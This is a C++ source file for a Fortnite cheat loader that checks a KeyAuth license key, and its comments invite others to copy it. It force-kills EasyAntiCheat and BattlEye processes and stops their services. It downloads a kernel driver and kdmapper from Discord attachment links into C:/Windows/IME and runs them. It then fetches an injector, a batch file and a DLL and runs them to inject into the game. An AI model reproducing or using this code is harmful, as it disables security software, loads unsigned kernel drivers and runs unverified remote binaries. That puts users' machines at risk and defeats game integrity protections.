#include "auth/auth.hpp"
#include "core/encryption/xorstr.hpp"
#include "core/util.h"
#include "core/logo.h"
#include "security/AntiDebug.h"
#include <iostream>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <thread>
#include <urlmon.h>

#include <string>
#include <conio.h>
#include <cstdlib>
#include <stdlib.h>
#include <ostream>
#include <regex>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <codecvt>
#include <fcntl.h>
#include <io.h>

#include <strsafe.h>
#include <windows.h>
#include <stdlib.h>

#include <random>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <winioctl.h>
#include <dwmapi.h>
#include <random>
#include <iostream>
#include <cstdlib>
#include <cstdlib>
#include <Lmcons.h>
#include <iostream>
#include <Windows.h>
#include "d3d.h"
#include <dwmapi.h>
#include <vector>
#include <thread>
#include <strsafe.h>
#include <fstream>
#include <strsafe.h>
#include <filesystem>
#include <urlmon.h>
#include <tchar.h>
#include <fcntl.h>
#include <io.h>
#include <stdio.h>
#include <Lmcons.h>
#include <Windows.h>
#include <string>
#include <sstream>
#include <vector>
#include <urlmon.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <thread>

#include <string>
#include <conio.h>
#include <cstdlib>
#include <stdlib.h>
#include <ostream>
#include <regex>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <codecvt>
#include <fcntl.h>
#include <io.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")
#include <urlmon.h>
#include <tchar.h>
#include <sddl.h> 

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ntdll.lib")

#include <iostream>
#include <random>
#include <urlmon.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")
#include <stdio.h>
#include <string>
#include <windows.h>
#include <Windows.h>
#include <tchar.h>
#include <Wininet.h>
#include <filesystem>
#pragma comment(lib, "wininet.lib")
#define _WIN32_WINNT 0x0500
using namespace std;
using namespace KeyAuth;


/* setup keyauth */
std::string name = XorStr(""); //keyauth app name
std::string ownerid = XorStr(""); //keyauth ownerid
std::string secret = XorStr(""); //keyauth app secret
std::string version = XorStr("1.0");
api KeyAuthApp(name, ownerid, secret, version);

/* setup protection*/
void antishit();
bool AntiDebugRunning = true;

/* setup general stuff */
std::string licensekey;
int option;
std::ofstream hwidfile;


/* 
I just improved the code from one of the loaders i found on github, enjoy pasting!
DM me on discord if you have any problems with this - habibi abdul#5490

The original repository - https://github.com/drklightxyz/keyauth-loader
*/


//Downloads to IME bc we do a little trolling
void bigwinverdrivers()
{
	system("taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1");
	system("taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1");
	system("taskkill /F /IM BEService.exe >nul 2>&1");
	system("taskkill /F /IM Fortnite.exe >nul 2>&1");
	system("taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1");
	system("taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1");
	system("sc stop BEService >nul 2>&1");
	system("sc stop BEDaisy >nul 2>&1");
	system("sc stop EasyAntiCheat >nul 2>&1");
	system("sc stop EasyAntiCheatSys >nul 2>&1");

	HRESULT e = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/863885312761528360/906212399567237151/20h2_drv.sys"), _T("C:/Windows/IME/20h2_drv.sys"), 0, NULL);
							
	HRESULT z = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/905707225740374026/905763413693726760/kdmappercustom.exe"), _T("C:/Windows/IME/kdmapper.exe"), 0, NULL);
				
	system("start C:/Windows/IME/kdmapper.exe C:/Windows/IME/20h2_drv.sys");
}
void smolwinverdrivers()
{
	system("taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1");
	system("taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1");
	system("taskkill /F /IM BEService.exe >nul 2>&1");
	system("taskkill /F /IM Fortnite.exe >nul 2>&1");
	system("taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1");
	system("taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1");
	system("sc stop BEService >nul 2>&1");
	system("sc stop BEDaisy >nul 2>&1");
	system("sc stop EasyAntiCheat >nul 2>&1");
	system("sc stop EasyAntiCheatSys >nul 2>&1");

	HRESULT c = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/863885312761528360/906212402603900928/1909_drv.sys"), _T("C:/Windows/IME/1909_drv.sys"), 0, NULL);
							
	HRESULT a = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/863885312761528360/906214413042843679/1909Mapper.exe"), _T("C:/Windows/IME/1909Mapper.exe"), 0, NULL);
				
	system("start C:/Windows/IME/1909Mapper.exe C:/Windows/IME/1909_drv.sys");
}

HWND window = NULL;

void ezcatcheat()
{
	system("cls");
	std::cout << XorStr("\n\n Start FortniteClient-Win64-Shipping.exe");
	while (window == NULL)
	{
		window = FindWindowA(0, "Fortnite  "); //findwindow bc we do a little trolling
		Sleep(1);
	}
	Beep(200, 200);
	std::cout << XorStr("\n\n Press Anything In The Lobby To Inject"); //+rep habibi
	system("pause >nul 2>&1");
	Beep(325, 300);
	Sleep(500);

	HRESULT t = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/863885312761528360/906212573555343400/sexmap.exe"), _T("C:/Windows/IME/sexmap.exe"), 0, NULL);
//the injector might not work bc of some shellcode shit, in the events of this, disable and third party overlays apart from discord / try enabling discord overlay then closing discord and running it as admin
	HRESULT plusrep = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/863885312761528360/906227826716475453/inject_1.bat"), _T("C:/Windows/IME/inject.bat"), 0, NULL);

	HRESULT abduljahar = URLDownloadToFile(NULL, _T("put the download for your dll here"), _T("C:/Windows/IME/Exotic.dll"), 0, NULL);//+rep bc penischeese.win

	system("start C:/Windows/IME/inject.bat");
}

int main()
{
	SetConsoleTitleA(XorStr("").c_str());
	std::thread anti(antishit);
	KeyAuthApp.init();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("[").c_str();
	Abdul::SetPenisRep(YELLOW);
	std::cout << XorStr("KEY").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("] - License key: ").c_str();
	std::cin >> licensekey;
	KeyAuthApp.license(licensekey);
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("[").c_str();
	Abdul::SetPenisRep(GREEN);
	std::cout << XorStr("SUCCESS").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("] - Key is valid, please wait").c_str();
	Sleep(2000);
	mainmenu:
	Abdul::Clear();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("\n[").c_str();
	Abdul::SetPenisRep(YELLOW);
	std::cout << XorStr("OPT - 1").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("] - Load 2004 - 20h2 [before game]").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("\n[").c_str();
	Abdul::SetPenisRep(YELLOW);
	std::cout << XorStr("OPT - 2").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("] - Load 1909 [before game]").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("\n[").c_str();
	Abdul::SetPenisRep(YELLOW);
	std::cout << XorStr("OPT - 3").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("] - Cheat").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("\n[").c_str();
	Abdul::SetPenisRep(YELLOW);
	std::cout << XorStr("OPT - 4").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("] - Exit").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("\n\n[").c_str();
	Abdul::SetPenisRep(YELLOW);
	std::cout << XorStr("OPTION").c_str();
	Abdul::SetPenisRep(WHITE);
	std::cout << XorStr("]: ").c_str();
	std::cin >> option;
	switch (option)
	{
	case 1:
		bigwinverdrivers();
		break;
	case 2:
		smolwinverdrivers();
		break;
	case 3:
		ezcatcheat();
		break;
	case 4:
		exit(0);
		break;
	}
}

void antishit()
{
	while (AntiDebugRunning)
	{
		AntiDebug::EndTask();
	}
}